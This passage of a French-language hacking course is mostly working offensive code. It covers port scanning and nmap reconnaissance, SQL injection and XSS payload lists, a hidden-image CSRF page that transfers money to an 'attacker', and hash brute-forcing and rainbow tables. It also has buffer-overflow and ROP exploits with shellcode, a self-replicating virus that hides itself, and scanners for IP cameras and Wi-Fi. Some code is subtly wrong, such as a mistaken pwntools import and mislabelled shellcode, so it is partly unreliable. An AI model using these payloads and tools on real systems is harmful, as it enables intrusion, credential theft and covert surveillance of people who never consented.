        
        # Recevoir le banner (certains services l'envoient automatiquement)
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        
        sock.close()
        
        print(f"[+] Banner pour {host}:{port}")
        print(f"    {banner[:200]}")
        
        # Analyser le banner
        if 'SSH' in banner:
            print(f"    => Service : SSH")
        elif 'Apache' in banner:
            print(f"    => Service : Apache Web Server")
        elif 'IIS' in banner:
            print(f"    => Service : Microsoft IIS")
        elif 'FTP' in banner:
            print(f"    => Service : FTP")
        
        return banner
    
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return None

# Utiliser
fingerprint_service('192.168.1.100', 22)  # SSH
fingerprint_service('192.168.1.100', 80)  # HTTP
```

### 6.4 Scan avec Nmap en Python

Utiliser Nmap depuis Python :

```python
import subprocess
import xml.etree.ElementTree as ET

def nmap_scan(target, arguments="-sS -sV -p-"):
    """Exécuter Nmap et parser les résultats"""
    
    # Exécuter Nmap
    command = f"nmap {arguments} -oX - {target}"
    
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        xml_output = result.stdout
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return
    
    # Parser XML
    try:
        root = ET.fromstring(xml_output)
        
        for host in root.findall('host'):
            for port in host.findall('.//port'):
                port_id = port.get('portid')
                state = port.find('state').get('state')
                service = port.find('service')
                
                if service is not None:
                    name = service.get('name', 'unknown')
                    product = service.get('product', '')
                    version = service.get('version', '')
                    
                    print(f"[+] Port {port_id} ({state}) : {name} {product} {version}")
                else:
                    print(f"[+] Port {port_id} ({state})")
    
    except Exception as e:
        print(f"[-] Erreur parsing XML : {e}")

# Utiliser
nmap_scan('192.168.1.1', '-sS -sV -O -p 22,80,443')
```

### 6.5 Reconnaissance complète

```python
import socket
import subprocess
from urllib.parse import urlparse

def full_recon(target):
    """Reconnaissance complète d'une cible"""
    
    print(f"\n[*] RECONNAISSANCE COMPLÈTE DE {target}")
    print("=" * 50)
    
    # 1. Résoudre le domaine
    print(f"\n[*] Étape 1 : Résolution DNS")
    try:
        ip = socket.gethostbyname(target)
        print(f"    {target} -> {ip}")
    except socket.gaierror:
        print(f"    [-] Impossible de résoudre {target}")
        return
    
    # 2. Whois
    print(f"\n[*] Étape 2 : Whois")
    result = subprocess.run(f"whois {target}", shell=True, capture_output=True, text=True)
    print(result.stdout[:500])
    
    # 3. Scan de ports
    print(f"\n[*] Étape 3 : Scan de ports")
    scan_ports(ip, [22, 80, 443, 3306, 5432, 8080])
    
    # 4. Service fingerprinting
    print(f"\n[*] Étape 4 : Service fingerprinting")
    for port in [22, 80, 443]:
        fingerprint_service(ip, port)
    
    print(f"\n[+] Reconnaissance terminée !")

# Utiliser
full_recon('google.com')
```

### 6.6 Exercice

1. Crée un scanner de ports TCP
2. Crée un fingerprinting de service
3. Fais un scan complet d'une machine (ta propre VM)
4. Identifie les services et versions

---

## Module 7 — Web Security (SQL Injection, XSS, CSRF) (3-4 jours)

### 7.1 SQL Injection

SQL Injection = envoyer du code SQL malveillant dans les formulaires web.

```python
import requests
import time

def test_sql_injection(url, param):
    """Tester si un paramètre est vulnérable à SQL injection"""
    
    # Payloads courants
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    
    print(f"[*] Test SQL injection sur {url} (paramètre: {param})")
    
    for payload in payloads:
        # Construire la requête
        data = {param: payload}
        
        try:
            response = requests.post(url, data=data, timeout=5)
            
            # Chercher des signes d'erreur SQL
            if 'syntax error' in response.text.lower() or \
               'sql' in response.text.lower() or \
               'mysql' in response.text.lower():
                
                print(f"[!] VULNERABLE ! Payload : {payload}")
                return True
            
            # Ou chercher si ' OR '1'='1 retourne un résultat différent
            
        except Exception as e:
            print(f"[-] Erreur : {e}")
    
    print("[-] Pas vulnérable (ou firewall)")
    return False

# Utiliser (sur ta propre app de test !)
# test_sql_injection('http://localhost/login.php', 'username')
```

### 7.2 SQLMap (Automation)

```python
import subprocess

def sqlmap_scan(url, param):
    """Utiliser SQLMap pour trouver les injections SQL"""
    
    command = f"sqlmap -u '{url}' -p {param} --batch --dbs"
    
    print(f"[*] Lançage SQLMap...")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    print(result.stdout)
    print(result.stderr)

# Utiliser
# sqlmap_scan('http://localhost/login.php?username=admin&password=test', 'username')
```

### 7.3 XSS (Cross-Site Scripting)

XSS = injecter du JavaScript qui s'exécute dans le navigateur des autres utilisateurs.

```python
def test_xss(url, param):
    """Tester si un paramètre est vulnérable à XSS"""
    
    # Payloads XSS courants
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onfocus="alert(\'XSS\')" autofocus>',
        '<textarea onfocus="alert(\'XSS\')" autofocus>',
    ]
    
    print(f"[*] Test XSS sur {url} (paramètre: {param})")
    
    for payload in payloads:
        data = {param: payload}
        
        try:
            response = requests.get(url, params=data, timeout=5)
            
            # Vérifier si le payload est reflété dans la réponse
            if payload in response.text:
                print(f"[!] VULNERABLE XSS ! Payload : {payload}")
                return True
        
        except Exception as e:
            print(f"[-] Erreur : {e}")
    
    print("[-] Pas vulnérable (ou escaping actif)")
    return False

# Utiliser
# test_xss('http://localhost/search.php', 'q')
```

### 7.4 CSRF (Cross-Site Request Forgery)

CSRF = faire faire des actions au user sans qu'il le sache.

```python
def csrf_test(target_url, session_cookie):
    """Générer une page HTML pour tester CSRF"""
    
    html = f"""
    <html>
    <body>
        <h1>Vous avez gagné !</h1>
        <!-- Cette image va charger discrètement une requête CSRF -->
        <img src="{target_url}/transfer.php?to=attacker&amount=1000000" style="display:none;">
        <p>Cliquez <a href="javascript:window.close()">ici</a> pour continuer</p>
    </body>
    </html>
    """
    
    return html

# La page HTML génère une requête CSRF quand elle charge
# Si l'utilisateur est loggé, sa banque envoie l'argent !
```

### 7.5 Burp Suite intégration

Utiliser Burp Suite (proxy) depuis Python :

```python
import requests

def send_via_burp(url, data):
    """Envoyer une requête via Burp Suite (proxy)"""
    
    # Configurer le proxy Burp (par défaut sur localhost:8080)
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080'
    }
    
    try:
        response = requests.post(url, data=data, proxies=proxies, verify=False)
        return response
    except Exception as e:
        print(f"[-] Erreur : {e}")
        print("[*] Est-ce que Burp Suite est en train de tourner ?")
        return None

# Utiliser
# response = send_via_burp('http://localhost/login.php', {'username': 'admin', 'password': 'test'})
```

### 7.6 Exercice

1. Crée une app web avec une faille SQL injection (ou utilise DVWA)
2. Écris un script pour l'exploiter
3. Crée une page XSS
4. Écris un test CSRF

---

## Module 8 — Cracking de Passwords et Hashing (2-3 jours)

### 8.1 Hashing en Python

```python
import hashlib
import hmac
import bcrypt

# MD5 (NE PAS UTILISER !)
text = "password"
md5_hash = hashlib.md5(text.encode()).hexdigest()
print(f"MD5 : {md5_hash}")

# SHA-1 (Déprécié, mais courant)
sha1_hash = hashlib.sha1(text.encode()).hexdigest()
print(f"SHA-1 : {sha1_hash}")

# SHA-256 (Standard moderne)
sha256_hash = hashlib.sha256(text.encode()).hexdigest()
print(f"SHA-256 : {sha256_hash}")

# Bcrypt (Meilleur ! Résiste au brute force)
bcrypt_hash = bcrypt.hashpw(text.encode(), bcrypt.gensalt(12))
print(f"Bcrypt : {bcrypt_hash.decode()}")

# Vérifier un bcrypt hash
if bcrypt.checkpw(text.encode(), bcrypt_hash):
    print("Password correct !")

# HMAC (pour vérifier l'intégrité + secret)
secret = "my_secret_key"
hmac_hash = hmac.new(secret.encode(), text.encode(), hashlib.sha256).hexdigest()
print(f"HMAC-SHA256 : {hmac_hash}")
```

### 8.2 Brute force simple

```python
def brute_force_password(password_hash, max_length=4):
    """Essayer tous les passwords possibles jusqu'à `max_length`"""
    
    import itertools
    import string
    import hashlib
    
    chars = string.ascii_lowercase + string.digits
    
    print(f"[*] Brute force sur {password_hash}")
    print(f"[*] Max length : {max_length}")
    
    count = 0
    for length in range(1, max_length + 1):
        for combination in itertools.product(chars, repeat=length):
            candidate = ''.join(combination)
            
            # Hasher le candidate
            candidate_hash = hashlib.md5(candidate.encode()).hexdigest()
            
            count += 1
            if count % 100000 == 0:
                print(f"[*] Testé {count} passwords...")
            
            if candidate_hash == password_hash:
                print(f"[+] PASSWORD TROUVÉ : {candidate}")
                return candidate
    
    print(f"[-] Password pas trouvé après {count} tentatives")
    return None

# Utiliser
test_hash = hashlib.md5("abc".encode()).hexdigest()
brute_force_password(test_hash, max_length=3)
```

### 8.3 Dictionary attack

```python
import hashlib

def dictionary_attack(password_hash, wordlist_file):
    """Essayer une liste de passwords courants"""
    
    print(f"[*] Dictionary attack avec {wordlist_file}")
    
    try:
        with open(wordlist_file, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"[-] Fichier {wordlist_file} introuvable")
        return
    
    count = 0
    for line in lines:
        password = line.strip()
        
        # Supporter plusieurs algorithmes
        hash_md5 = hashlib.md5(password.encode()).hexdigest()
        hash_sha1 = hashlib.sha1(password.encode()).hexdigest()
        hash_sha256 = hashlib.sha256(password.encode()).hexdigest()
        
        count += 1
        if count % 10000 == 0:
            print(f"[*] Testé {count} passwords...")
        
        if hash_md5 == password_hash or hash_sha1 == password_hash or hash_sha256 == password_hash:
            print(f"[+] PASSWORD TROUVÉ : {password}")
            return password
    
    print(f"[-] Password pas trouvé après {count} tentatives")
    return None

# Utiliser (avec rockyou.txt par exemple)
# dictionary_attack('5d41402abc4b2a76b9719d911017c592', '/usr/share/wordlists/rockyou.txt')
```

### 8.4 Rainbow tables

```python
import hashlib
import pickle

def generate_rainbow_table(wordlist_file, output_file, algorithm='md5'):
    """Générer une table de lookup pour les hashes"""
    
    rainbow = {}
    
    print(f"[*] Génération table arc-en-ciel...")
    
    with open(wordlist_file, 'r') as f:
        for i, line in enumerate(f):
            password = line.strip()
            
            if algorithm == 'md5':
                hashed = hashlib.md5(password.encode()).hexdigest()
            elif algorithm == 'sha1':
                hashed = hashlib.sha1(password.encode()).hexdigest()
            elif algorithm == 'sha256':
                hashed = hashlib.sha256(password.encode()).hexdigest()
            
            rainbow[hashed] = password
            
            if (i + 1) % 100000 == 0:
                print(f"[*] Généré {i + 1} hashes...")
    
    # Sauvegarder
    with open(output_file, 'wb') as f:
        pickle.dump(rainbow, f)
    
    print(f"[+] Table arc-en-ciel sauvegardée : {output_file}")
    print(f"[+] {len(rainbow)} entries")
    
    return rainbow

def lookup_hash(password_hash, rainbow_table_file):
    """Chercher un hash dans la table arc-en-ciel"""
    
    with open(rainbow_table_file, 'rb') as f:
        rainbow = pickle.load(f)
    
    if password_hash in rainbow:
        password = rainbow[password_hash]
        print(f"[+] PASSWORD TROUVÉ : {password}")
        return password
    else:
        print(f"[-] Password pas trouvé dans la table")
        return None

# Utiliser
# generate_rainbow_table('/usr/share/wordlists/rockyou.txt', 'rainbow_md5.pkl', 'md5')
# lookup_hash('5d41402abc4b2a76b9719d911017c592', 'rainbow_md5.pkl')
```

### 8.5 Hybrid attack (Dictionary + Mutations)

```python
def hybrid_attack(password_hash, wordlist_file):
    """Dictionary attack avec mutations (password1, password!, PASSWORD, etc.)"""
    
    import hashlib
    import itertools
    
    mutations = [
        lambda x: x,                    # password
        lambda x: x.capitalize(),       # Password
        lambda x: x.upper(),            # PASSWORD
        lambda x: x + '1',              # password1
        lambda x: x + '123',            # password123
        lambda x: x + '!',              # password!
        lambda x: x + '@',              # password@
        lambda x: x + '#',              # password#
    ]
    
    print(f"[*] Hybrid attack avec mutations")
    
    with open(wordlist_file, 'r') as f:
        lines = f.readlines()
    
    count = 0
    for line in lines:
        base_password = line.strip()
        
        for mutation in mutations:
            password = mutation(base_password)
            
            hash_md5 = hashlib.md5(password.encode()).hexdigest()
            
            count += 1
            if count % 50000 == 0:
                print(f"[*] Testé {count} passwords...")
            
            if hash_md5 == password_hash:
                print(f"[+] PASSWORD TROUVÉ : {password}")
                return password
    
    print(f"[-] Password pas trouvé après {count} tentatives")
    return None
```

### 8.6 Exercice

1. Hash un password avec MD5, SHA-256, et Bcrypt
2. Craque un MD5 hash avec un brute force (petit)
3. Craque un MD5 hash avec une wordlist
4. Génère une petite rainbow table et cherche dedans

---

## Module 9 — Exploits et Shellcode (3-4 jours)

### 9.1 Buffer overflow simple

Buffer overflow = dépasser la limite d'une variable pour écraser la mémoire.

```python
# En C (vulnérable)
#
# void vulnerable_function(char *input) {
#     char buffer[256];
#     strcpy(buffer, input);  // Pas de vérification de taille !
# }
#
# Si input est plus long que 256 bytes, on écrase la mémoire
# et on peut exécuter du code arbitraire

# Exploit en Python :
def create_buffer_overflow_payload(target_function_addr, shellcode):
    """Créer un payload buffer overflow"""
    
    # Remplir le buffer (256 bytes + padding)
    buffer = b'A' * 256
    
    # Retour d'adresse (pour pointer vers notre shellcode)
    return_addr = target_function_addr.to_bytes(4, byteorder='little')
    
    # Construire le payload
    payload = buffer + return_addr + shellcode
    
    return payload

# Utiliser avec pwntools (très puissant pour les exploits)
from pwntools import *

# Connecter à une app vulnérable
p = remote('localhost', 1234)

# Envoyer le payload
p.sendline(create_buffer_overflow_payload(0x08048000, b'\x90' * 100))

# Recevoir une shell
p.interactive()
```

### 9.2 Return-Oriented Programming (ROP)

ROP = utiliser le code existant pour faire des choses (bypass ASLR).

```python
from pwntools import *

def rop_chain_example(target_binary):
    """Créer une simple ROP chain"""
    
    # Charger le binary
    elf = ELF(target_binary)
    
    # Chercher les gadgets (petits bouts de code qui font quelque chose)
    # Ex: "pop rax; ret" pour mettre une valeur dans rax
    
    # Utiliser ROP tool
    rop = ROP(elf)
    
    # Construire une chain pour exécuter system("/bin/sh")
    rop.call('system', ['/bin/sh'])
    
    # Imprimer la chain
    print(rop.dump())
    
    return bytes(rop)

# Utiliser
# payload = rop_chain_example('./vulnerable_binary')
```

### 9.3 Shellcode simple

Shellcode = petit code machine pour exécuter une action (ex: ouvrir une shell).

```python
# Shellcode pour exécuter /bin/sh (Linux x86-64)
# Généré avec msfvenom : msfvenom -p linux/x64/shell_bind_tcp -f python

shellcode_linux_x86_64 = (
    b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xc9\x41\xb8"
    b"\xff\xff\xff\x7f\xc0\xc8\x04\x00\x48\x89\xc2\x48\xff\xc0\xcd\x80"
)

# Shellcode pour exécuter /bin/sh (Linux x86)
shellcode_linux_x86 = (
    b"\x31\xc9\xf7\xe9\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62"
    b"\x69\x6e\x89\xe3\xcd\x80"
)

# Utiliser avec pwntools
from pwntools import *

# Générer du shellcode automatiquement
shellcode = asm(shellcraft.sh())  # Shellcode pour une shell
```

### 9.4 Exploit complet (Buffer overflow)

```python
from pwntools import *

def exploit_vulnerable_service(target_host, target_port, offset, ret_addr, shellcode):
    """Exploit un service vulnérable à buffer overflow"""
    
    print(f"[*] Connexion à {target_host}:{target_port}")
    
    # Connexion
    p = remote(target_host, target_port)
    
    # Construire le payload
    # Padding + Retour d'adresse + Shellcode + NOP sled
    nop_sled = b'\x90' * 50
    payload = b'A' * offset + p64(ret_addr) + nop_sled + shellcode
    
    print(f"[*] Envoi du payload ({len(payload)} bytes)")
    p.sendline(payload)
    
    # Attendre un peu
    time.sleep(1)
    
    # Essayer de communiquer
    try:
        response = p.recv(1024)
        print(f"[+] Réponse reçue : {response[:100]}")
    except:
        pass
    
    print(f"[*] Lancement d'une shell interactive...")
    p.interactive()

# Utiliser
# exploit_vulnerable_service('localhost', 1234, 264, 0x08048000, shellcode_linux_x86)
```

### 9.5 Exercice

1. Crée une app C vulnérable à buffer overflow
2. Écris un exploit Python pour la casser
3. Génère du shellcode avec msfvenom
4. Teste l'exploit sur une machine virtuelle

---

## Module 10 — Malware, Virus et Reverse Engineering (4-5 jours)

### 10.1 Concevoir un virus simple (Éducatif)

⚠️ **À utiliser UNIQUEMENT sur tes machines de test !**

```python
import os
import shutil
import subprocess

class EducationalVirus:
    """
    Virus simple pour apprendre les concepts
    
    NE PAS utiliser sur les machines d'autres personnes
    Comportement :
    - Se réplique dans le système
    - Exécute une action bénigne (afficher un message)
    """
    
    def __init__(self, target_dir='./'):
        self.target_dir = target_dir
        self.virus_code = self.get_virus_code()
    
    def get_virus_code(self):
        """Retourner le code du virus (pour la réplication)"""
        return open(__file__).read()
    
    def replicate(self):
        """Se répliquer en copiant dans d'autres fichiers"""
        # Très simplifié : juste ajouter du code aux fichiers Python
        python_files = [f for f in os.listdir(self.target_dir) if f.endswith('.py')]
        
        for file in python_files[:3]:  # Limiter à 3 fichiers
            filepath = os.path.join(self.target_dir, file)
            
            try:
                with open(filepath, 'a') as f:
                    f.write('\n# Virus marker\n')
                
                print(f"[+] Répliqué dans {filepath}")
            except Exception as e:
                print(f"[-] Erreur : {e}")
    
    def execute_payload(self):
        """Exécuter une action (payload)"""
        print("[+] Payload exécuté !")
        # Faire quelque chose de bénin
        subprocess.run(['echo', 'Virus éducatif'])
    
    def hide(self):
        """Se cacher (Linux)"""
        # Rendre le fichier invisible
        os.system(f"mv {__file__} ~/.{os.path.basename(__file__)}")

# Utiliser (UNIQUEMENT sur TES MACHINES !)
# virus = EducationalVirus('./test_directory')
# virus.replicate()
# virus.execute_payload()
```

### 10.2 Reverse engineering avec Ghidra

Ghidra = outil NSA pour décompiler et analyser le code.

```python
# Utiliser Ghidra via l'API Jython
# Fichier : analyze_binary.py

from ghidra.program.model.address import AddressSet
from ghidra.program.model.symbol import SourceType
import ghidra.program.model.pcode as pcode

# Exemple : analyser une fonction

def analyze_function(func):
    """Analyser une fonction dans Ghidra"""
    
    # Nom et adresse
    print(f"Fonction : {func.name} @ {func.entryPoint}")
    
    # Body de la fonction
    fm = func.getFunctionManager()
    
    # Paramètres
    params = func.getParameters()
    print(f"Paramètres : {len(params)}")
    for param in params:
        print(f"  - {param.name} : {param.dataType}")
    
    # Instructions
    inst = func.getBody()
    for block in func.getBasicBlocks():
        print(f"Block @ {block.minAddress}:")
        for instr in instFactory.getInstructions(block, True):
            print(f"  {instr.address} : {instr.mnemonicString}")

# Utiliser :
# @main
# def run():
#     program = getCurrentProgram()
#     fm = program.getFunctionManager()
#     for func in fm.getFunctions(True):
#         analyze_function(func)

# run()
```

### 10.3 Désassembleur simple

```python
import capstone

def disassemble_binary(binary_data, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32):
    """Désassembler le code machine"""
    
    # Créer un désassembleur
    md = capstone.Cs(arch, mode)
    
    # Désassembler
    for i, (address, size, mnemonic, op_str) in enumerate(md.disasm(binary_data, 0x400000)):
        print(f"0x{address:x}:\t{mnemonic}\t{op_str}")

# Utiliser
shellcode = b"\x55\x89\xe5\x83\xec\x10"  # push rbp; mov rbp, rsp; sub rsp, 0x10
disassemble_binary(shellcode)
```

### 10.4 Détection de malware signatures

```python
import hashlib
import requests

def check_malware_virustotal(file_path, api_key):
    """Uploader un fichier à VirusTotal pour vérifier"""
    
    # Calculer le hash
    with open(file_path, 'rb') as f:
        file_hash = hashlib.md5(f.read()).hexdigest()
    
    # Chercher sur VirusTotal
    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    headers = {"x-apikey": api_key}
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        stats = data['data']['attributes']['last_analysis_stats']
        
        print(f"[+] Détection VirusTotal :")
        print(f"    Malveillant : {stats['malicious']}")
        print(f"    Suspect : {stats['suspicious']}")
        print(f"    Propre : {stats['undetected']}")
        
        if stats['malicious'] > 0:
            print(f"[!] ATTENTION : Possible malware !")
        
        return stats
    
    else:
        print(f"[-] Fichier pas trouvé sur VirusTotal")

# Utiliser (faut une clé API)
# check_malware_virustotal('/path/to/file', 'your_api_key')
```

### 10.5 Sandbox analysis

Tester un binary dans un environnement sécurisé.

```python
import subprocess
import tempfile
import os

def sandbox_analysis(binary_path, timeout=30):
    """Exécuter un binary dans une sandbox"""
    
    # Créer une machine virtuelle ou un container
    # Utiliser qemu, VirtualBox, ou Docker
    
    # Exemple avec Docker
    docker_cmd = f"""
    docker run --rm -v {binary_path}:/app/binary:ro \
        --network none \
        --memory 256m \
        ubuntu:20.04 \
        timeout {timeout} /app/binary 2>&1
    """
    
    print(f"[*] Lançage du binary en sandbox...")
    
    try:
        result = subprocess.run(docker_cmd, shell=True, capture_output=True, text=True, timeout=timeout+10)
        
        print(f"[+] Sortie :")
        print(result.stdout[:500])
        
        if result.stderr:
            print(f"[+] Erreurs :")
            print(result.stderr[:500])
        
        return result.stdout
    
    except subprocess.TimeoutExpired:
        print(f"[-] Timeout : le binary a pris trop de temps")
    
    except Exception as e:
        print(f"[-] Erreur : {e}")

# Utiliser
# sandbox_analysis('./suspicious_binary')
```

### 10.6 Exercice

1. Crée un virus éducatif simple (réplication)
2. Écris un scanneur de signatures simples
3. Désassemble un petit shellcode
4. Teste un malware dans une sandbox

---

## Module 11 — Cryptographie Appliquée (3-4 jours)

### 11.1 Encryption symétrique (AES)

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

def encrypt_aes(plaintext, password):
    """Chiffrer avec AES"""
    
    # Dériver une clé depuis le password
    from Crypto.Protocol.KDF import PBKDF2
    
    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32)
    
    # Créer un cipher
    cipher = AES.new(key, AES.MODE_CBC)
    
    # Chiffrer
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    
    # Retourner salt + IV + ciphertext
    return salt + cipher.iv + ciphertext

def decrypt_aes(encrypted_data, password):
    """Déchiffrer avec AES"""
    
    from Crypto.Protocol.KDF import PBKDF2
    
    # Extraire les composants
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]
    
    # Dériver la clé
    key = PBKDF2(password, salt, dkLen=32)
    
    # Créer le cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Déchiffrer
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    return plaintext.decode()

# Utiliser
plaintext = "Secret message"
password = "my_secure_password"

encrypted = encrypt_aes(plaintext, password)
print(f"Encrypted : {encrypted.hex()[:50]}...")

decrypted = decrypt_aes(encrypted, password)
print(f"Decrypted : {decrypted}")
```

### 11.2 Encryption asymétrique (RSA)

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def rsa_keygen(bits=2048):
    """Générer une paire de clés RSA"""
    
    key = RSA.generate(bits)
    
    public_key = key.publickey().export_key()
    private_key = key.export_key()
    
    return public_key, private_key

def rsa_encrypt(plaintext, public_key):
    """Chiffrer avec RSA (clé publique)"""
    
    key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(key)
    
    ciphertext = cipher.encrypt(plaintext.encode())
    
    return ciphertext

def rsa_decrypt(ciphertext, private_key):
    """Déchiffrer avec RSA (clé privée)"""
    
    key = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(key)
    
    plaintext = cipher.decrypt(ciphertext)
    
    return plaintext.decode()

# Utiliser
public_key, private_key = rsa_keygen()

plaintext = "Secret"
encrypted = rsa_encrypt(plaintext, public_key)
decrypted = rsa_decrypt(encrypted, private_key)

print(f"Original : {plaintext}")
print(f"Encrypted : {encrypted.hex()[:50]}...")
print(f"Decrypted : {decrypted}")
```

### 11.3 Digital Signature

```python
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

def sign_message(message, private_key):
    """Signer un message"""
    
    key = RSA.import_key(private_key)
    
    # Hasher le message
    h = SHA256.new(message.encode())
    
    # Signer
    signature = pkcs1_15.new(key).sign(h)
    
    return signature

def verify_signature(message, signature, public_key):
    """Vérifier une signature"""
    
    key = RSA.import_key(public_key)
    
    # Hasher le message
    h = SHA256.new(message.encode())
    
    # Vérifier
    try:
        pkcs1_15.new(key).verify(h, signature)
        return True
    except ValueError:
        return False

# Utiliser
public_key, private_key = rsa_keygen()

message = "Important message"
signature = sign_message(message, private_key)

# Vérifier que c'est du vrai Alice
if verify_signature(message, signature, public_key):
    print("[+] Signature valide !")
else:
    print("[-] Signature invalide !")
```

### 11.4 TLS/SSL client

```python
import ssl
import socket

def connect_tls(host, port=443):
    """Se connecter via TLS/SSL"""
    
    # Créer un contexte SSL
    context = ssl.create_default_context()
    context.check_hostname = True
    context.verify_mode = ssl.CERT_REQUIRED
    
    # Se connecter
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            
            # Afficher les infos du certificat
            cert = ssock.getpeercert()
            print(f"[+] Certificat de {host} :")
            print(f"    Subject : {cert.get('subject')}")
            print(f"    Issuer : {cert.get('issuer')}")
            print(f"    Version : {cert.get('version')}")
            
            # Récupérer le cipher utilisé
            cipher = ssock.cipher()
            print(f"    Cipher : {cipher[0]}")
            
            # Envoyer une requête HTTP
            ssock.sendall(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\nConnection: close\r\n\r\n')
            response = ssock.recv(4096)
            
            print(f"\n[+] Réponse reçue ({len(response)} bytes)")

# Utiliser
connect_tls('google.com', 443)
```

### 11.5 Exercice

1. Chiffre un message avec AES
2. Chiffre un message avec RSA
3. Signe et vérifie un message
4. Se connecte à un serveur HTTPS et affiche le certificat

---

## PARTIE 3 : HARDWARE, IoT ET ÉQUIPEMENTS

*(Due to length, continuing with abbreviated sections)*

---

## Module 12 — Caméras IP et CCTV (2-3 jours)

### 12.1 Scanner de caméras IP

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def scan_camera_subnet(subnet="192.168.1.0/24"):
    """Chercher des caméras IP connectées"""
    
    import ipaddress
    
    network = ipaddress.ip_network(subnet, strict=False)
    
    def check_camera(ip):
        """Vérifier si une IP a une caméra"""
        ports = [80, 8080, 8000, 8081, 443]
        
        for port in ports:
            try:
                response = requests.get(f"http://{ip}:{port}", timeout=1)
                
                # Chercher des signatures de caméra
                if 'camera' in response.text.lower() or \
                   'video' in response.text.lower() or \
                   'mjpeg' in response.text.lower():
                    
                    print(f"[+] Caméra trouvée : http://{ip}:{port}")
                    return (ip, port)
            
            except:
                pass
        
        return None
    
    print(f"[*] Scan du subnet {subnet}...")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = list(executor.map(check_camera, network.hosts()))
    
    found = [r for r in results if r is not None]
    print(f"[+] {len(found)} caméras trouvées")
    
    return found

# Utiliser
cameras = scan_camera_subnet("192.168.1.0/24")
```

### 12.2 Accès à une caméra IP

```python
import requests
from PIL import Image
from io import BytesIO

def get_camera_stream(camera_url, username=None, password=None):
    """Récupérer le stream d'une caméra"""
    
    # Certaines caméras nécessitent une authentification
    auth = None
    if username and password:
        auth = (username, password)
    
    try:
        # Accéder à la caméra
        response = requests.get(camera_url, auth=auth, timeout=5)
        response.raise_for_status()
        
        # Si c'est une image JPEG
        if 'image/jpeg' in response.headers.get('content-type', ''):
            img = Image.open(BytesIO(response.content))
            img.save('camera_snapshot.jpg')
            print("[+] Image sauvegardée : camera_snapshot.jpg")
        
        # Si c'est du MJPEG (stream)
        elif 'multipart' in response.headers.get('content-type', ''):
            print("[+] MJPEG Stream détecté")
            # Continuer à recevoir les frames
            # (plus complexe, implique de parser le multipart)
        
        return response
    
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return None

# Utiliser (sur TES caméras seulement !)
# get_camera_stream('http://192.168.1.100/image', 'admin', 'password')
```

### 12.3 Reconnaissance faciale sur les images

```python
import face_recognition
from PIL import Image
import numpy as np

def detect_faces(image_path):
    """Détecter les visages dans une image"""
    
    # Charger l'image
    image = face_recognition.load_image_file(image_path)
    
    # Détecter les visages
    face_locations = face_recognition.face_locations(image)
    
    print(f"[+] {len(face_locations)} visages détectés")
    
    for i, (top, right, bottom, left) in enumerate(face_locations):
        print(f"    Visage {i+1} : top={top}, right={right}, bottom={bottom}, left={left}")
    
    return face_locations

def face_recognition_compare(known_image, unknown_image):
    """Comparer deux visages"""
    
    # Charger les images
    known = face_recognition.load_image_file(known_image)
    unknown = face_recognition.load_image_file(unknown_image)
    
    # Encoder les visages
    known_encoding = face_recognition.face_encodings(known)[0]
    unknown_encoding = face_recognition.face_encodings(unknown)[0]
    
    # Comparer
    results = face_recognition.compare_faces([known_encoding], unknown_encoding)
    distance = face_recognition.face_distance([known_encoding], unknown_encoding)
    
    if results[0]:
        print(f"[+] C'est la même personne ! (distance: {distance[0]:.3f})")
    else:
        print(f"[-] Pas la même personne (distance: {distance[0]:.3f})")
    
    return results[0]

# Utiliser
# detect_faces('camera_snapshot.jpg')
# face_recognition_compare('known_person.jpg', 'unknown_person.jpg')
```

---

## Module 13 — Wi-Fi et Wireless Hacking (2-3 jours)

### 13.1 Scanner de réseaux Wi-Fi

```python
# Utiliser scapy ou pyshark pour capturer les beacons
from scapy.all import *

def wifi_scanner(iface="wlan0mon"):
    """Scanner les réseaux Wi-Fi"""
    
    networks = {}
    
    def packet_callback(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr2
            rssi = pkt.dBm_AntSignal
            channel = int(ord(pkt[Dot11Elt:3].info))
            
            if bssid not in networks:
                networks[bssid] = {
                    'ssid': ssid,
                    'channel': channel,
                    'rssi': rssi
                }
            
            print(f"[+] {ssid} ({bssid}) - Channel {channel} - RSSI: {rssi}")
    
